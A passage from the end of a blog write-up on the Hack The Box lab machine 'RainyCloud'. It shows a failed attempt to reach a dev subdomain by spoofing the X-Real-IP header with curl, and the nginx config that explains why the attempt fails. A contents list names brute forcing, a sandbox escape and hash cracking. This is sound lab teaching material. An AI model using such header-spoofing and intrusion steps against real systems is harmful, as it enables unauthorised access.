</code></pre></div><p>However, even if we add this header, we can&rsquo;t access <code>dev.rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.184 -H <span class="code-dark-yellow">'X-Real-IP: 172.18.0.3'</span> -H <span class="code-dark-yellow">'Host: dev.rainycloud.htb'</span>  
Access Denied - Invalid IP
</code></pre></div><p>And the reason is in the configuration for nginx (<code>/etc/nginx/sites-available/default</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">server</span> {
    <span class="mtk7">listen</span> <span class="mtk6">80</span> default_server;
    <span class="mtk7">listen</span> [::]:80 default_server;

    <span class="mtk7">root</span> /var/www/rainycloud;

    <span class="mtk7">index</span> index.html index.htm index.nginx-debian.html;  

    <span class="mtk7">server_name</span> rainycloud.htb;

    <span class="mtk8">location</span> / {
        <span class="mtk7">proxy_set_header</span> Host <span class="mtk4">$host</span>;
        <span class="mtk7">proxy_set_header</span> X-Real-IP <span class="mtk4">$remote_addr</span>;
        <span class="mtk7">proxy_pass</span> http://172.17.0.1:8080;
    }
}
</code></pre></div><p>The header <code>X-Real-IP</code> is overwritten by nginx using <code>$remote_addr</code>, so we are not able to bypass it.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#user-enumeration">User enumeration</a></li><li><a href="#brute-force-attack">Brute force attack</a></li><li><a href="#javascript-file-enumeration">JavaScript file enumeration</a></li><li><a href="#container-enumeration">Container enumeration</a></li><li><a href="#accessing-the-development-environment">Accessing the development environment</a></li><li><a href="#api-enumeration">API enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#reading-files-from-the-server">Reading files from the server</a></li><li><a href="#accessing-jacks-container">Accessing <code>jack</code>&rsquo;s container</a></li><li><a href="#access-via-ssh">Access via SSH</a></li></ul></li><li><a href="#lateral-movement-to-user-jack_adm">Lateral movement to user <code>jack_adm</code></a><ul><li><a href="#escaping-python-sandbox">Escaping Python sandbox</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#finding-the-secret-pepper">Finding the secret pepper</a></li><li><a href="#cracking-roots-hash">Cracking <code>root</code>&rsquo;s hash</a></li></ul></li><li><a href="#clarifications">Clarifications</a><ul><li><a href="#api-type-juggling">API Type Juggling</a></li><li><a href="#user-enumeration-1">User enumeration</a></li><li><a href="#process-inspection-from-the-containers">Process inspection from the containers</a></li><li><a href="#ip-address-validation">IP address validation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>